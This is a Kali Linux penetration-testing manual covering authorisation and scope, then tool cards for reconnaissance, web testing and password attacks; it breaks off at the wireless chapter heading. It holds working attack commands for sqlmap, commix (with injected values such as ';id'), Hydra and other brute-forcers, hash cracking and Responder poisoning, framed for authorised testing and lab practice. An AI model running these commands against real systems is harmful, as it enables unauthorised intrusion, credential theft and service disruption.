Before you touch a keyboard

Authorisation, scope, evidence, stop conditions

Kali does not make an action legal, and neither does an article. The difference between a penetration test and a crime is a signed scope, a test window and a person who can tell you to stop. Read this page before the tool pages; the commands assume you have already done it.

The legal baseline

Unauthorised access, interception and modification of systems or data are criminal offences in most jurisdictions, including Portugal (Lei do Cibercrime, Lei n.º 109/2009) and Brazil (Lei n.º 12.737/2012, the Lei Carolina Dieckmann), and civilly actionable elsewhere. "I was only scanning" is not a defence when the scan was not authorised. This is not legal advice: your lawyer and your client define the contract.

The blog has longer arguments about why this matters: Ethical Hacking, Pentesting Society and Interpretation of Attacks and Security Choices. If you have not read them, the short version is: capability is not permission, and the target's safety is part of the job.

The six-line contract

  1. Parties. Who is authorised to test, on whose behalf, and who signs.
  2. Assets. Exact domains, IP ranges, cloud accounts, applications, APIs and accounts in scope — plus an explicit exclusion list.
  3. Time. Start, end, blackout periods, rate limits and whether out-of-hours work is allowed.
  4. Rules. No denial of service, no social engineering, no data exfiltration beyond proof, no persistence without consent.
  5. Stop. A named contact, an out-of-band channel, and the conditions that end the test immediately.
  6. Data. Where evidence lives, how it is encrypted, who can read it, when it is destroyed.

Build a lab you can break

Rehearse on systems that cannot call a lawyer. A host-only virtual network with a deliberately vulnerable target is enough for every command in this manual. Take a snapshot before each drill and revert after it; an un-reverted lab teaches you the wrong lesson about persistence.

What Kali is — and what it is not

A Debian rolling distribution with a curated security toolkit

Kali is Debian unstable packaged with a security workflow. That sentence explains both its strength and its main operational risk: you inherit Debian's package ecosystem and Kali's rolling pace, including fresh tools and fresh bugs. It is a workstation for assessments, not a hardened server and not an invisibility cloak.

Install and first ten minutes

# Verify the ISO against the published SHA256 and GPG signature before writing it.
sha256sum kali-linux-2026.*-installer-amd64.iso
# Inside the installed system: update the index, then the whole rolling system.
sudo apt update
sudo apt full-upgrade -y
# A minimal but complete CLI toolkit (no desktop). Pick metapackages you actually need.
sudo apt install kali-linux-headless
# Configure shell, metapackages, kernel and network defaults.
sudo kali-tweaks
# Confirm you are not root by default and that sudo is deliberate.
id && sudo -v

Credentials changed in 2020

Current Kali live images use kali/kali; the installer asks you to create your own user. The old root/toor pair belongs to history. Change the live password immediately, create a non-root account, and never run a browser or office suite as root.

What Kali is not

  • Not stealthy by default. Its traffic, user agents, DNS lookups and tool signatures are well known. Stealth is an operational decision, not a distro feature.
  • Not a daily driver. A rolling security distro with hundreds of packages is a large attack surface. Use a hardened daily OS and keep Kali in a VM or a dedicated machine.
  • Not a server. Do not expose Kali as a public service. Use Debian or RHEL for that.
  • Not a collection of magic buttons. Every tool produces evidence that you must interpret. A scanner's finding is a hypothesis; manual confirmation is proof.
  • Not the only option. Parrot, BlackArch and plain Debian with your own tooling exist. The Linux distributions field manual explains the families.

Snapshot discipline

Take a clean snapshot after installation, another before every apt full-upgrade, and a per-engagement snapshot before you install a tool or change a network profile. Rolling releases occasionally break packages; a snapshot turns a lost day into a five-minute rollback.

Shell fluency is not optional. If find, grep, awk, redirection and pipes are not automatic, read Bash: From Zero to Hero first. For the scripting that glues tools together, Python 3 — From Zero to Hero is the natural next step.

The map: choose the right family

A tool answers a question. Start with the question.

Beginners collect tools; operators collect answers. A scan, a fuzzer and an exploit framework are not interchangeable because they all "do security". Each phase below has a different question, a different evidence standard and a different risk to the target.

Three rules that survive every tool

  1. Verify before you escalate. A version banner is not a vulnerability. Confirm with a safe request, a second tool and a reproducible step.
  2. Match aggression to permission. A production login form is not a lab. Rate limits, lockout policies and fragile devices are part of scope.
  3. Log as if the report depends on it — because it does. Command, timestamp, target, output file and hash. If it is not in the evidence directory, it did not happen.

The phases are not a waterfall. You will loop back to enumeration after every new credential and back to scoping after every new hostname. The Penetration Testing Execution Standard and the OWASP Web Security Testing Guide are the standard reference maps; this page is the tool-level companion.

03

Reconnaissance & OSINT

Hosts, names, ports, services — and the difference between a lead and a fact

Recon is where you earn the rest of the engagement. Passive collection uses public records and third-party sources; active collection sends packets to the target and can be logged, rate-limited or reported. Do passive first, write down every source, and never let a scanner's timeout become a conclusion.

14 cardspassive → activescope first

Your recon is also evidence about you

DNS queries, certificate-transparency lookups, user agents and scan sources are visible to the target and to third parties. Use infrastructure you are authorised to use, not a borrowed VPS, and never assume Tor makes an active scan anonymous — it usually makes it slower and more suspicious.

nmap

pkg: nmap

What it does. The reference port scanner: host discovery, TCP/UDP port states, service and version detection, OS guesses and the NSE scripting engine. It is the tool you use to understand a host, not merely to find an open port.

sudo nmap -sn 10.10.10.0/24 -oA evidence/scans/discovery
sudo nmap -sS -p- --min-rate 1000 -oA evidence/scans/all-tcp 10.10.10.5
sudo nmap -sCV -p 22,80,443 --script safe -oA evidence/scans/services 10.10.10.5
Run it
Broad discovery first, then all TCP ports, then a narrow service/script pass. Save with -oA; a scan without output is a rumour. Use -Pn when ICMP is filtered, -T2 on fragile links, --reason to see why a port is marked open.
Avoid
-T5 on production or WAN links, --script vuln as a first move (noisy and occasionally disruptive), and UDP sweeps of entire ranges. Closed and filtered are different findings.
Instead of
masscan or rustscan for speed; nmap for truth. -sT works without raw sockets but is more connection-heavy; -sS is the usual choice when you have root.

masscan

pkg: masscan

What it does. An asynchronous TCP port scanner with its own userland network stack. It trades accuracy and depth for raw speed across very large address ranges: no service detection, no scripts, no OS fingerprinting.

sudo masscan -p1-65535 10.10.10.0/24 --rate=1000 \
  --exclude 10.10.10.1 -oL evidence/scans/masscan.lst
Run it
Only on ranges you own or are authorised to test. Start at --rate 1000, watch for packet loss, then verify every hit with nmap. Add --wait 3 so late replies are not lost.
Avoid
Internet-wide scans, rates that saturate a shared uplink, and treating a masscan miss as "closed". Its stack can be less reliable than the kernel's, especially behind NAT or stateful firewalls.
Instead of
Use it to find candidates across /16s and /8s; hand each live host to nmap. For a single host or a /24, rustscan is usually more convenient and nmap alone is already fast enough.

rustscan

pkg: rustscan

What it does. Finds open TCP ports quickly, then automatically hands the open ports to nmap for service and script detection. Think of it as a fast front door with nmap waiting inside.

rustscan -a 10.10.10.5 --ulimit 5000 -- -sV -sC -oA evidence/scans/rustscan
Run it
Everything after -- is passed to nmap. Raise --ulimit only on a machine you control. Use -b to tune batch size and --scan-order random to reduce obvious sequential patterns.
Avoid
Assuming its result is more accurate than nmap. It is a convenience wrapper; the nmap pass is what produces the evidence. Do not run high concurrency through a fragile VPN or IDS-heavy path.
Instead of
Use rustscan for a quick "which ports are open?" on one host; nmap directly when you need careful timing or complex NSE; masscan for enormous ranges.

arp-scan

pkg: arp-scan

What it does. Discovers hosts on the local Layer-2 segment using ARP requests. Because ARP is not routed, it is authoritative only for the subnet you are plugged into — and it often finds devices that ignore ICMP.

sudo arp-scan -I eth0 --localnet --retry 2
Run it
Use --localnet or an explicit CIDR, and confirm the interface with ip -brief addr. Repeat once to catch sleeping devices. The vendor column comes from the MAC OUI and is a hint, not proof.
Avoid
Using it to infer hosts behind a router; ARP does not cross L3 boundaries. Do not confuse a silent host with an absent one — some stacks rate-limit ARP replies.
Instead of
nmap -sn is better for routed discovery; arp-scan is better for the local wire and for finding quiet appliances. Compare both before declaring a subnet empty.

dnsrecon

pkg: dnsrecon

What it does. Enumerates DNS records and infrastructure: standard record types, zone-transfer attempts, SRV records, cache snooping and dictionary-based subdomain brute force. It is the quick, scriptable DNS check before a heavier mapping tool.

dnsrecon -d example.com -t std --json evidence/recon/dnsrecon.json
dnsrecon -d example.com -t brt \
  -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Run it
Start with -t std, then targeted -t axfr against each authoritative name server. Brute force only with permission and a sensible wordlist; use --threads conservatively so you do not poison your own resolver.
Avoid
Treating NXDOMAIN as proof a name does not exist (wildcards and split-horizon DNS exist), and brute-forcing a third-party domain you merely found in a certificate.
Instead of
dnsenum adds scraping and whois; fierce is lighter and focuses on non-contiguous IP space; amass is the deep mapping tool. dnsrecon is the fast first pass.

dnsenum

pkg: dnsenum

What it does. A Perl-era DNS enumeration script: record lookups, zone-transfer attempts, subdomain brute force, reverse lookups and optional search-engine scraping. It remains useful because its output is compact and its zone-transfer routine is blunt.

dnsenum --enum example.com \
  -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r
Run it
Use --enum as the shortcut and -r for recursive brute force. Save the terminal output; dnsenum's file output is less structured than dnsrecon's JSON.
Avoid
Relying on its Google scraping — search providers block or change formats constantly. Do not run recursion without a time limit; it can expand quickly.
Instead of
Prefer dnsrecon for clean JSON and current record types, or amass for a serious map. Keep dnsenum for a quick second opinion or an environment where it is already installed.

fierce

pkg: fierce

What it does. A focused DNS reconnaissance tool for finding hosts in non-contiguous IP space: it resolves names, tests zone transfers, detects wildcards and brute-forces subdomains with a small, fast workflow.

fierce --domain example.com \
  --subdomains /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Run it
Read the wildcard warning: if every random name resolves, brute-force results are meaningless until you filter the wildcard address. Keep the default timeouts for public DNS and raise them only in a lab.
Avoid
Using it as an attack tool — it is a resolver and a mapper. It will not find names that only exist in internal DNS, and it cannot see hosts that never appear in DNS.
Instead of
Faster to type than amass and cleaner than dnsenum for a single domain. Choose amass when you need certificates, ASNs, API sources and a graph; choose fierce for a five-minute answer.

whois

pkg: whois

What it does. Queries the registration system for a domain, IP or ASN: registrar, creation and expiry dates, name servers, registrant organisation (when not redacted) and abuse contacts. RDAP is the modern JSON successor.

whois example.com
whois -h whois.iana.org example.com
curl -s https://rdap.org/domain/example.com | jq '.events, .nameservers'
Run it
Query the authoritative registry for the TLD, then the registrar. Record the retrieval date; registration data goes stale. Use RDAP when you need machine-readable output.
Avoid
Trusting redacted fields or assuming the registrant is the operator. Privacy services, resellers and subsidiaries routinely hide the real owner. Do not use whois data for social engineering outside scope.
Instead of
DNS tells you what resolves now; whois tells you who registered it and when. They answer different questions and often disagree.

theHarvester

pkg: theharvester

What it does. Collects public emails, hostnames, employee names and URLs from search engines, certificate transparency and other sources. It is contact-and-surface OSINT, not a port scanner.

theHarvester -d example.com -b duckduckgo,bing,crtsh -l 300 \
  -f evidence/recon/harvester
Run it
Use crtsh for certificate-history hostnames, and add API keys in /etc/theHarvester/api-keys.yaml for paid or rate-limited sources. Keep -l modest and save the HTML/JSON report.
Avoid
Assuming an email belongs to a current employee, or that a hostname still resolves. Verify before use. Respect provider terms and anti-spam law; harvested addresses are not a mailing list.
Instead of
amass maps infrastructure; theHarvester finds people and contact points; SpiderFoot automates both with correlation. Use the lightest one that answers the question.

amass

pkg: amass

What it does. Maps an organisation's external attack surface: subdomains, IPs, ASNs, certificate names and relationships. Passive mode uses public sources; active mode adds DNS resolution, brute force and zone walking.

amass enum -passive -d example.com -o evidence/recon/amass-passive.txt
amass enum -active -d example.com -brute -w wordlist.txt \
  -o evidence/recon/amass-active.txt
Run it
Passive first, always. Configure API keys in ~/.config/amass/config.yaml for better coverage, set -timeout, and keep the JSON output for the graph. Read the log: amass tells you which sources failed.
Avoid
Launching -active against a client's production DNS without warning — it is noisy. Do not assume the result is complete; private DNS, split horizon and CDNs hide whole estates.
Instead of
Use amass when scope is a whole organisation and you need relationships; dnsrecon/fierce for a quick domain check; theHarvester when the question is people, not infrastructure.

recon-ng

pkg: recon-ng

What it does. A modular OSINT framework with workspaces, a database and import/export. You load modules, set a source, run them, and the results persist so later modules can consume earlier findings.

recon-ng
[recon-ng][default] > workspaces create client
[recon-ng][client] > marketplace search
[recon-ng][client] > modules load recon/domains-hosts/hackertarget
[recon-ng][client] > options set SOURCE example.com
[recon-ng][client] > run
[recon-ng][client] > show hosts
Run it
One workspace per client or engagement. Install only the modules you need; marketplace install pulls from a remote index. Add API keys with keys add, then export with the reporting modules.
Avoid
Assuming modules still work — upstream sites change and break them constantly. Do not mix clients in one workspace; the database becomes evidence and confidentiality risk.
Instead of
SpiderFoot is more automated and visual; recon-ng gives you a deliberate, analyst-driven pipeline with a queryable database. Choose based on whether you want a workflow or a scan.

SpiderFoot

pkg: spiderfoot

What it does. Automates OSINT collection with 200+ modules, then correlates the results into a graph of domains, IPs, people, breaches and technologies. It can run from a local web UI or from the command line.

spiderfoot -l 127.0.0.1:5001
# then open http://127.0.0.1:5001 and add the target as a new scan
Run it
Bind to 127.0.0.1 unless you have added authentication and TLS. Start with a "passive" scan profile, enable only modules whose terms you accept, and expect it to run for a long time.
Avoid
Exposing the web UI to the internet; it has no meaningful auth by default. Do not enable intrusive modules on a target without written permission.
Instead of
SpiderFoot is breadth and correlation; recon-ng is a controlled pipeline; theHarvester is a single question. Use SpiderFoot when you need the graph, not when you need one answer.

whatweb

pkg: whatweb

What it does. Fingerprints web stacks: server, CMS, frameworks, JavaScript libraries, analytics, cookies and version hints. It turns a URL into a short technology profile that tells you which tests are worth running.

whatweb -a 3 -v https://example.com
Run it
Aggression 1 is polite, 3 is a good default, 4 is loud. Use --user-agent to identify yourself honestly, and corroborate the stack with headers and page source.
Avoid
Reporting "WordPress 6.x" as a vulnerability without the exact version and a matching advisory. Fingerprints can be spoofed, cached or inherited from a CDN.
Instead of
wafw00f answers "is a WAF in front?"; nikto checks server misconfiguration; whatweb answers "what is this built with?". Start here, then choose the specialist.

wafw00f

pkg: wafw00f

What it does. Detects and identifies web application firewalls by sending carefully chosen requests and comparing responses. It tells you whether a WAF exists and often which product, not how to bypass it.

wafw00f -a https://example.com
Run it
Test the exact hostname and scheme in scope; a WAF on the apex does not imply one on an API subdomain. Repeat after a block to see whether the response changed.
Avoid
Treating "no WAF detected" as permission to hammer the target. Rate limiting, CDNs and custom filters may not be fingerprinted. Detection is not authorisation to evade.
Instead of
whatweb identifies the application; wafw00f identifies the defence in front of it. Run both, then adjust rate and test depth — not ethics.

The recon exit condition

Stop when a new source stops producing new assets, not when a tool finishes. Write one line per asset with source, first seen, resolved address and confidence. That table becomes the scope map for the next phase — and the evidence that you stayed inside it.

Web application testing

Proxy, crawl, fuzz, confirm — in that order

Web testing is mostly a map-making exercise. A proxy shows you what the browser actually sends; content discovery finds what the site does not link; scanners compare what you found against known patterns; exploit tools prove one specific hypothesis. Skipping the map is how people "find" the same 404 page forty times and call it a vulnerability.

12 cardsproxy → fuzz → verifythrottle production

Production is not a lab

Destructive tests (DELETE, checkout, password reset, file upload, command injection) need explicit permission and a rollback plan. Prefer a staging copy with production-like data. When only production exists, test with the least invasive request that proves the issue and stop there.

The web testing loop

  1. Configure one browser profile that trusts the interception CA and nothing else. Never use your daily browser for testing.
  2. Crawl and click the application with the proxy recording. Authentication, roles and state changes matter more than the root page.
  3. Map inputs: parameters, JSON bodies, headers, cookies, file names, GraphQL operations, WebSocket messages.
  4. Fuzz narrowly with a calibrated wordlist and rate limit. Compare response length, status, words and timing.
  5. Confirm manually in Repeater or with curl, then capture the smallest request that proves impact.

Burp Suite

pkg: burpsuite

What it does. An intercepting HTTP(S) proxy with the manual-testing toolkit around it: Repeater for editing and resending requests, Intruder for structured attacks, Decoder/Comparer for payloads and diffs, and a large extension ecosystem. Community edition is free; Pro adds the scanner and project saving.

burpsuite
# Proxy listener: 127.0.0.1:8080
# Browser profile proxy: 127.0.0.1:8080, then import Burp's CA certificate
Run it
Set a target scope and turn on "Show only in-scope items" before you browse. Intercept only while you need to edit; otherwise let traffic pass. Use Repeater for every finding and save the exact request/response as evidence.
Avoid
Leaving Intruder Community running large lists — it is deliberately throttled and will look like a DoS. Do not install random BApp extensions into a client engagement without reviewing them.
Instead of
ZAP is the free automated alternative; mitmproxy is the scriptable CLI alternative. Burp wins on manual ergonomics and extensions, not on being the only proxy.

OWASP ZAP

pkg: zaproxy

What it does. A fully open-source intercepting proxy and web scanner. Passive scanning analyses traffic you generate; active scanning sends attack payloads against in-scope requests. It also has a powerful automation framework and a headless daemon mode.

zaproxy
# or run the daemon locally for automation:
zaproxy -daemon -host 127.0.0.1 -port 8090
Run it
Passive scan first and read the alerts; they are hints, not verdicts. For active scan, define a context, include only in-scope URLs and exclude logout/destructive endpoints. Cap threads and requests per second on production.
Avoid
Running the active scanner at default strength against a live site without warning. Do not leave the API key disabled on a non-loopback interface; that is an open remote-control port.
Instead of
ZAP is the better free choice when you need built-in scanning and automation; Burp Community is stronger for manual work. Use one proxy at a time to avoid certificate and traffic confusion.

ffuf

pkg: ffuf

What it does. A fast, generic web fuzzer. FUZZ can replace a path segment, a parameter value, a header value, a hostname or a POST body field. Filters let you discard the noise so the interesting responses stand out.

ffuf -u https://example.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -fc 404 -t 20 -rate 40 -of json -o evidence/web/ffuf-dirs.json

ffuf -u https://example.com/ -H "Host: FUZZ.example.com" \
  -w subdomains.txt -fs 4242 -t 20 -rate 40
Run it
Calibrate first: request a random path and note its size/words/lines, then filter with -fs, -fw or -fl. -ac automates calibration. Start at 20 threads and 40 req/s; raise only after watching error rates.
Avoid
Hitting a login or search endpoint with thousands of requests and no rate limit. Do not trust a hit until you fetch it manually; soft-404s and catch-all routes produce beautiful false positives.
Instead of
ffuf is the most flexible general fuzzer; gobuster is simpler for standard directory/DNS modes; feroxbuster is better for deep recursive content discovery; wfuzz is payload-oriented.

gobuster

pkg: gobuster

What it does. A focused brute-forcer with separate modes: dir for paths and files, dns for subdomains, vhost for virtual hosts, and cloud-storage modes. It is simpler than a general fuzzer and its output is easy to read.

gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -t 20 --exclude-length 1234 -o evidence/web/gobuster.txt

gobuster dns -d example.com -w subdomains.txt --show-ips
Run it
Use --exclude-length to remove the site's soft-404. Add extensions that match the stack you fingerprinted. For vhosts, use --append-domain and compare against the default response.
Avoid
-k (skip TLS verification) outside a lab; it hides certificate problems and trains bad habits. Do not assume 403 means "nothing there" — it may be a protected resource worth reporting.
Instead of
Choose gobuster for a quick, standard wordlist run; ffuf for filters and arbitrary request positions; feroxbuster when recursion and link extraction matter.

feroxbuster

pkg: feroxbuster

What it does. A fast recursive content-discovery tool written in Rust. It follows discovered directories automatically, extracts links from responses, filters wildcard noise and keeps a clean per-target output.

feroxbuster -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html -t 50 --rate-limit 50 --filter-status 404,403 \
  -o evidence/web/feroxbuster.txt
Run it
Recursion is on by default; set --depth to keep it bounded. Use --smart to stop on wildcard-heavy branches, and --extract-links to find paths the wordlist never contained.
Avoid
Letting recursion explode on a calendar or e-commerce site with millions of synthetic URLs. Watch the request rate and stop branches that only return the same page.
Instead of
feroxbuster is the best default for depth-first content discovery; ffuf for precise fuzzing; gobuster for a predictable single pass; dirb for legacy environments.

dirb

pkg: dirb

What it does. The classic directory brute-forcer. It walks a wordlist, recurses into discovered directories and prints a simple report. It is old, single-threaded and noisy, but it is still useful for a quick check or an environment where nothing newer is installed.

dirb https://example.com /usr/share/wordlists/dirb/common.txt \
  -S -r -o evidence/web/dirb.txt
Run it
-S silences the banner, -r disables recursion, and -o saves the result. Use a site-specific wordlist if you have one; common.txt is a floor, not a strategy.
Avoid
Using it for large engagements: no concurrency tuning, no modern filters, and it will be slow. Do not let recursion run unattended.
Instead of
Reach for ffuf, gobuster or feroxbuster. Keep dirb for a compatibility check or for teaching what a brute-forcer actually does.

wfuzz

pkg: wfuzz

What it does. A Python fuzzer built around payloads, encoders and iterators. It can combine multiple wordlists, chain encoders (URL, base64, hex) and filter responses by status, size, word count or regex. It is slower than the Rust/Go tools but very expressive.

wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 --hh 1234 -t 20 https://example.com/FUZZ
Run it
Use --hc for status, --hh for character count, -z for payload sources. Print the payload with -v and save with -f evidence/web/wfuzz.csv,csv.
Avoid
Multi-wordlist products that explode the request count. Calculate list A × list B before running; it is easy to turn a fuzzer into a load test.
Instead of
wfuzz is for payload gymnastics; ffuf is faster for the same job; gobuster is simpler. Use wfuzz when encoders and chained payloads are the point.

nikto

pkg: nikto

What it does. Checks a web server for thousands of known issues: dangerous files, outdated components, missing headers, exposed administrative paths and default content. It is a server-configuration scanner, not an application-logic tester.

nikto -h https://example.com -ssl -Tuning 123b \
  -o evidence/web/nikto.html -Format html
Run it
Use -Tuning to keep the check set relevant, and review every "OSVDB" or CVE reference against the actual version. Combine with a proxy (-useproxy) if you need to see the raw requests.
Avoid
Running it stealthily and expecting silence: its user agent and request pattern are famous. Do not report every informational header as a vulnerability.
Instead of
nuclei is template-based and more precise for known CVEs; nikto is broader and noisier for server hygiene. Run nikto for a quick baseline, then verify with manual requests.

sqlmap

pkg: sqlmap

What it does. Detects and exploits SQL injection: boolean/time-based blind, error-based, UNION, stacked queries and out-of-band channels. It can enumerate databases, tables and data, and optionally gain command execution through the database.

sqlmap -r evidence/web/login.request -p username --batch \
  --level=2 --risk=1 --technique=BEU --threads=4 \
  --dbs --output-dir=evidence/web/sqlmap
Run it
Save the exact request from Burp/ZAP and use -r; it preserves cookies, headers and method. Start at --level 2 --risk 1, target one parameter, and dump only the minimum data needed to prove impact.
Avoid
--risk 3 on production (it can modify or delete data), --os-shell without explicit scope, and unbounded dumping of personal data. --flush-session destroys your own evidence trail.
Instead of
Manual Repeater/curl first to confirm the injection; sqlmap to automate proof. commix is the command-injection counterpart; nuclei may detect a known SQLi CVE but cannot replace exploitation logic.

WPScan

pkg: wpscan

What it does. Enumerates WordPress installations: version, plugins, themes, users and known vulnerabilities. It is the specialist tool for a CMS that powers a huge share of the web, and it depends on an external vulnerability database for meaningful results.

wpscan --url https://example.com --enumerate vp,vt,u \
  --plugins-detection mixed --random-user-agent --max-threads 5 \
  --api-token "$WPSCAN_TOKEN" -o evidence/web/wpscan.json -f json
Run it
Get a free API token and export it as an environment variable, not in shell history. Enumerate vulnerable plugins (vp), vulnerable themes (vt) and users (u) in that order. Confirm each version before reporting.
Avoid
Password brute-forcing through WPScan without knowing the lockout policy. Do not treat user enumeration as critical by itself; it is a step, not the impact.
Instead of
whatweb tells you it is WordPress; WPScan tells you which parts are old; nuclei can check specific CVEs; sqlmap handles an injection if you find one. Match the tool to the layer.

commix

pkg: commix

What it does. Detects and exploits OS command injection in web parameters, headers and request bodies. It supports classic results, blind time-based injection and out-of-band exfiltration, and can open an interactive pseudo-shell.

commix --url="https://example.com/ping.php?ip=127.0.0.1" \
  --batch --level=2 --output-dir=evidence/web/commix
Run it
Confirm manually first with a harmless separator and a benign command such as ;id or |whoami. Then let commix automate the proof. Keep commands read-only and log everything.
Avoid
Running destructive commands, reverse shells to unapproved hosts, or --os-shell on a production system without written permission and a cleanup plan.
Instead of
sqlmap is for SQL injection; commix is for shell metacharacters reaching the OS. Different bug, different tool. Nuclei may flag a known command-injection CVE, but exploitation still needs verification.

nuclei

pkg: nuclei

What it does. Runs a large, community-maintained library of YAML templates against targets. Each template describes a request, a matcher and often a CVE or misconfiguration. It is fast triage and verification for known patterns — not a logic tester and not a fuzzer.

nuclei -u https://example.com -severity critical,high \
  -rl 50 -c 25 -stats -o evidence/web/nuclei.txt
Run it
Update templates in a controlled way, read the template before trusting its result, and confirm every hit with a manual request. Start with severity filters and low concurrency; -rl is requests per second per template.
Avoid
Pointing it at a client's whole IP space without scope. Community templates can be wrong or over-broad; a "critical" result that you cannot reproduce is not a finding.
Instead of
nikto is older and broader; nuclei is template-driven and easier to audit. Neither replaces a human testing an application's business logic.

05

Passwords & credentials

Online guessing, offline cracking, and the lockout you did not read about

Two completely different jobs share this chapter. Online attacks send guesses to a live service and risk lockouts, alerts and denial of service. Offline attacks take a hash or capture and work on your own hardware, where the only limits are time, heat and the strength of the password. Use the right one; the wrong one either breaks the target or wastes your GPU.

8 cardsonline vs offlinelockout policy first

Read the authentication policy before the first guess

Account lockout, exponential backoff, CAPTCHA, MFA, IP reputation and SIEM alerts are part of the target's design. Five wrong guesses can lock a service account and stop a business process. In an engagement, agree a guess budget in writing and stop at it.

Hydra

pkg: hydra

What it does. Online credential testing across dozens of protocols (SSH, FTP, RDP, SMB, HTTP forms, databases and more). It is fast, mature and very easy to point at the wrong thing.

hydra -L users.txt -P pass.txt -t 4 -f -V \
  -o evidence/creds/hydra-ssh.txt ssh://10.10.10.5

hydra -l admin -P pass.txt 10.10.10.5 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid credentials" -t 2 -f
Run it
Use -t 4 or fewer on real services, -f to stop at the first success, and -u to iterate users before passwords (reduces per-account lockout risk). For HTTP forms, copy the exact field names and failure string from the proxy.
Avoid
Spraying a production VPN or mail gateway. Do not test passwords belonging to real employees without explicit scope, and never store recovered credentials in plaintext outside the evidence vault.
Instead of
Hydra has the widest protocol list; Medusa is better at parallel hosts; ncrack is tuned for network authentication with timing templates. All three are online attacks.

Medusa

pkg: medusa

What it does. A parallel, modular online login tester. It is designed to test many hosts or users at once, with modules for common services and a stable, script-friendly interface.

medusa -h 10.10.10.5 -u admin -P pass.txt -M ssh \
  -t 4 -f -O evidence/creds/medusa-ssh.txt
Run it
List modules with medusa -d. Use -T for a host file, -t for parallel logins per host, and -O for the output log. Test one credential pair manually before launching a list.
Avoid
Parallelism that hides lockouts: many hosts times many users can lock every account before you notice. Do not use it to "audit" a service you do not own.
Instead of
Medusa is convenient for many hosts; Hydra has broader protocol quirks and better HTTP form handling; ncrack focuses on network auth timing. None of them bypass MFA.

ncrack

pkg: ncrack

What it does. A network authentication cracker from the Nmap project. It targets SSH, RDP, FTP, Telnet, VNC, SMB and HTTP auth with timing templates and connection limits, and is designed to be gentler on fragile services than a naive parallel loop.

ncrack -U users.txt -P pass.txt ssh://10.10.10.5 \
  -f -CL 2 -T 2 -o evidence/creds/ncrack.txt
Run it
-T 0 is slow and polite, -T 5 is aggressive; start at 2. -CL limits connections per service. Test RDP carefully: failed logins are slow and very visible.
Avoid
Using timing templates as an excuse to skip scope. Do not run it against a host whose lockout policy you have not checked; RDP and VPN gateways are especially sensitive.
Instead of
ncrack when timing and connection control matter; Hydra for breadth and HTTP forms; Medusa for many hosts. For hashes, go offline to John or hashcat.

John the Ripper

pkg: john

What it does. An offline password cracker with a huge format list, rules, incremental modes and companion *2john extractors for files and key material. It is the CPU workhorse and the tool that turns an SSH key, ZIP or password database into a crackable hash.

ssh2john id_rsa > evidence/creds/id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=SSH --rules=Jumbo evidence/creds/id_rsa.hash
john --show --format=SSH evidence/creds/id_rsa.hash
Run it
Name the format explicitly; auto-detection is convenient but easy to misread. Use --fork=N for CPU cores, --session for long runs, and --pot to keep a known pot file per engagement.
Avoid
Running --incremental without a length limit on a slow hash. Do not delete the pot file: it is both your result and your evidence of work.
Instead of
John is stronger on CPU, format conversion and odd file types; hashcat is stronger on GPU throughput and rule/mask attacks. Many operators use both.

hashcat

pkg: hashcat

What it does. A GPU-accelerated password cracker with an enormous mode list (MD5, NTLM, SHA-crypt, bcrypt, WPA, NetNTLMv2 and hundreds more), dictionary, combination, mask and rule-based attacks, and a restore file for long runs.

hashcat -m 1000 -a 0 evidence/creds/ntlm.txt \
  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule \
  -O -w 3 --potfile-path=evidence/creds/hashcat.pot

hashcat -m 22000 -a 0 evidence/wifi/hash.hc22000 \
  /usr/share/wordlists/rockyou.txt -O -w 2
Run it
Identify the hash with hashcat --example-hashes or your source tool, then choose the mode. Use -O for speed (it limits password length), -w 2 on a working machine, -w 3 only when the GPU can cool itself. Save the pot file.
Avoid
Guessing the mode; a wrong -m wastes hours. Do not run -w 4 on a laptop, and do not claim a password is strong because rockyou did not contain it.
Instead of
hashcat for GPU throughput and mask/rule attacks; John for CPU jobs, format conversion and quick file hashes. Both read the same recovered plaintext if you share a pot file.

crunch

pkg: crunch

What it does. Generates wordlists from a character set, a length range and an optional pattern. It is for targeted masks (company name plus four digits), not for replacing a real dictionary.

crunch 8 8 -t Pass%%%% -o evidence/words/numeric.txt
crunch 6 8 abc123 -o evidence/words/alnum.txt
Run it
In -t, @ means lowercase, , uppercase, % digits and ^ symbols. Estimate the size before writing: 8 lowercase characters is 208 billion lines, not a wordlist. Use -b to split output across files.
Avoid
Filling the disk with a combinatorial monster. Do not generate a list on the same partition as the evidence vault; a full disk corrupts captures and reports.
Instead of
cewl harvests words from the target; crunch constructs patterns. Combine a small target-specific list with rules in hashcat or John before generating raw combinations.

cewl

pkg: cewl

What it does. Crawls a website and extracts words, phrases and email addresses into a wordlist. It captures the organisation's vocabulary — product names, jargon, names — which is often more useful than a generic dictionary.

cewl -d 3 -m 5 --with-numbers -e \
  -w evidence/words/target-words.txt https://example.com
Run it
-d sets crawl depth, -m the minimum word length, -e collects emails, --with-numbers includes variants. Keep the crawl polite; a wordlist does not justify a load test.
Avoid
Crawling the whole internet or a site whose terms forbid it. Do not assume harvested words match password policy; combine with mutations and rules.
Instead of
Use cewl for language specific to the target, then hashcat rules or John rules to mutate it. crunch is for generated patterns, not for meaning.

Responder

pkg: responder

What it does. Listens for broadcast name-resolution protocols (LLMNR, NBT-NS, mDNS) and answers them, capturing NetNTLM hashes from Windows clients that ask for a name nobody else answers. It can also run rogue WPAD and proxy services.

sudo responder -I eth0 -wv
# analyse first, without poisoning:
sudo responder -I eth0 -A
Run it
Start with -A to see what the segment broadcasts. Then run a short, announced capture window. Crack NetNTLMv2 offline with hashcat -m 5600, or relay it with ntlmrelayx when SMB signing allows.
Avoid
Running it on a network you do not own: it poisons name resolution and can break file shares and printing. Do not leave it running unattended after the test window.
Instead of
Responder captures name-service credentials; ettercap/bettercap do broader L2 MITM; hashcat turns the capture into a password. They are a pipeline, not alternatives.

Hash identification is half the job

06

Wireless

Radio is different: every frame is a legal and physical event

